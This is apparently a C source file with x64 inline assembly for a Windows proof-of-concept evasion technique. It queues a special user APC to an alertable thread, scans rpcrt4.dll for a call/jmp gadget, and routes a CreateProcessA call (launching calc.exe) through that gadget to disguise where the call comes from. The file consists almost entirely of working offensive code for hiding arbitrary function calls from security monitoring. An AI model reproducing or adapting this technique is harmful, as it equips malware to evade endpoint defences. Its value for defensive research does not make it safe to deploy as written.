#include <windows.h>
#include <stdio.h>
#include <stddef.h>


typedef BOOL (WINAPI* QueueUserAPC2_t)(PAPCFUNC ApcRoutine, HANDLE Thread, ULONG_PTR Data, QUEUE_USER_APC_FLAGS Flags);

typedef struct _FUNC_CALL {
    UINT_PTR function;
    UINT_PTR argc;
    UINT_PTR argv[10];
} FUNC_CALL, PFUNC_CALL;

typedef struct _GADGET {
    LPVOID call;          // 0
    UINT_PTR disp_scratch;  // 8
    INT32 call_disp;        // 16
    INT8 jmp_disp;          // 20
} GADGET, *PGADGET;

typedef struct _INTERRUPT_ARG {
    FUNC_CALL func_call;
    GADGET gadget;
    UINT_PTR rsi_save; // 120
    UINT_PTR rbx_save; // 128
    UINT_PTR ret;      // 136
    HANDLE   h_done;   // 144
} INTERRUPT_ARG, *PINTERRUPT_ARG;

#ifdef WIN_X64
__attribute__((naked))
void sleepExSetup() {
    __asm("mov rcx, 0xffffffff\n"
        "mov rdx, 1\n"
        "jmp SleepEx\n");
}

__attribute__((naked))
void interuptStub(PAPC_CALLBACK_DATA data) {
  __asm("sub rsp, 0x118\n" // rpcrt4 gadget frame size

        "mov r10, [rcx]\n"     // INTERRUPT_ARG / function
        "mov r11, [rcx + 8]\n" // ContextRecord

        "mov qword ptr [r10 + 120], rsi\n" // Save rsi
        "mov qword ptr [r10 + 128], rbx\n" // Save rbx
        "mov rbx, r10\n" // Store INTERRUPT_ARG for epilogue

        //"mov qword ptr [r11 + 0x4F0], 0\n"
        "mov qword ptr [r11 +0x78], 0x101\n" // Have RtlDelayExecution return
                                             // with STATUS_ALERTED

        "lea r11, [r10 + 16]\n" // &argv

        "mov rax, [r10 + 8]\n" // argc
        "dec rax\n"            // 0 indexing
        "mov rcx, rax\n"       // stack offset
        "sub rcx, 4\n"
        ".stackArgs:\n"
        "cmp rax, 4\n"
        "jl .done\n"
        "mov r8, [r11 + rax*8]\n"
        "mov qword ptr [rsp + rcx*8 + 0x20], r8\n"
        "dec rax\n"
        "dec rcx\n"
        "jmp .stackArgs\n"

        ".done:\n"
        //"mov qword ptr [r10+96+8], r10\n"
        "mov rcx, r10\n" // pointer to target function, needs call displacement
        "movsxd rdx, dword ptr [r10 + 96 + 16]\n" // call displacement
        "lea rax, [rcx]\n" // pointer to function pointer
        "sub rax, rdx\n"   // apply displacement

        //"mov qword ptr [r10 + 96 + 8], OFFSET interruptEpilogue\n" // target epilogue
        "movsx rdx, byte ptr [r10 + 96 + 20]\n"  // jmp displacement
        "lea rsi, [r10 + 96 + 8]\n" // pointer to epilogue
        "sub rsi, rdx\n"

        "mov rcx, [r11]\n"
        "mov rdx, [r11 + 8]\n"
        "mov r8,  [r11 + 16]\n"
        "mov r9,  [r11 + 24]\n"
        "jmp [r10 + 96]\n");
}

__attribute__((naked))
void interruptEpilogue() {
    __asm(
        "add rsp, 0x118\n"
        "mov rcx, rbx\n"
        "mov rsi, [rcx+120]\n"
        "mov rbx, [rcx+128]\n"
        "mov qword ptr [rcx+136], rax\n"

        "mov rdx, [rcx+144]\n"
        "mov rcx, rdx\n"
        "call SetEvent\n"
        "ret\n"
    );
}
#endif

BOOL findGadget(HMODULE h_module, OUT PGADGET gadget) {
    UINT_PTR base = (UINT_PTR)h_module;
    PIMAGE_DOS_HEADER dos_hdr = (PIMAGE_DOS_HEADER)base;
    if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(base + dos_hdr->e_lfanew);
    if (nt_hdr->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);

    UINT_PTR text_start = 0;
    UINT_PTR text_end = 0;
    for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec_hdr[i].Name, ".text", 6) == 0) {
            text_start = base + sec_hdr[i].VirtualAddress;
            text_end = text_start + sec_hdr[i].Misc.VirtualSize;
            break;
        }
    }
    if (text_start == 0) return FALSE;

    // This could be expaned for other registers and displacements probably
    BYTE call[2] = { 0xFF, 0x90 }; // call [rax +/- 32_disp]
    BYTE jmp[2] = { 0xFF, 0x66 };  // jmp [rsi +/- 8_disp]
    printf("[findGadget] 0x%llx 0x%llx\n", text_start, text_end);
    for (PBYTE i = (PBYTE)text_start; (UINT_PTR)i < text_end; i++) {
        if (memcmp(i, call, 2) == 0 && memcmp(i+6, jmp, 2) == 0) {
            gadget->call = i;
            gadget->disp_scratch = (UINT_PTR)interruptEpilogue;
            gadget->call_disp = *(PINT32)(i+2);
            gadget->jmp_disp = *(PINT8)(i+8);
            printf("[findGadget] 0x%p : %d : %x\n", i, gadget->call_disp, gadget->jmp_disp);
            break;
        }
    }
    return TRUE;
}

UINT_PTR stitch(HANDLE h_thread) {
    printf("[+] Queueing APC : 0x%p\n", (LPVOID)interuptStub);
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    FUNC_CALL func_call = { 0 };
    func_call.function = (UINT_PTR)CreateProcessA;
    func_call.argc = 10;
    func_call.argv[0] = (UINT_PTR)"C:\\Windows\\System32\\calc.exe";
    func_call.argv[4] = FALSE;
    func_call.argv[8] = (UINT_PTR)&si;
    func_call.argv[9] = (UINT_PTR)&pi;
    
    HMODULE h_combase = GetModuleHandleA("rpcrt4.dll");
    if (h_combase == NULL) h_combase = LoadLibraryA("rpcrt4.dll");
    GADGET gadget = { 0 };
    findGadget(h_combase, &gadget);
    HANDLE h_done = CreateEvent(NULL, TRUE, FALSE, NULL);

    // FUNC_CALL call = { 0 };
    // call.function = (UINT_PTR)MessageBoxA;
    // call.argc = 4;
    // call.argv[0] = 0;
    // call.argv[1] = 0;
    // call.argv[3] = 0;
    // call.argv[4] = 0;
    INTERRUPT_ARG arg = { .gadget = gadget, .func_call = func_call, .h_done = h_done };

    printf("[ARG] FUNC_CALL : %llu\tGADGET : %llu\trsi_save : %llu\n", offsetof(INTERRUPT_ARG, func_call), offsetof(INTERRUPT_ARG, gadget), offsetof(INTERRUPT_ARG, rsi_save));
    if (!QueueUserAPC2((PAPCFUNC)interuptStub, h_thread, (ULONG_PTR)&arg, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC | QUEUE_USER_APC_CALLBACK_DATA_CONTEXT)) {
        printf("[ERR:QueueUserAPC2] : 0x%lx\n", GetLastError());
    }
    WaitForSingleObject(h_done, INFINITE);
    return arg.ret;
}

int main() {
    HANDLE h_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sleepExSetup, NULL, 0, NULL);
    Sleep(100);

    printf("0x%p\n", interuptStub);
    BOOL b_createprocess = (BOOL)stitch(h_thread);
    printf("[+] stitch(CreateProcessA) : 0x%x", b_createprocess);

    return 0;
}
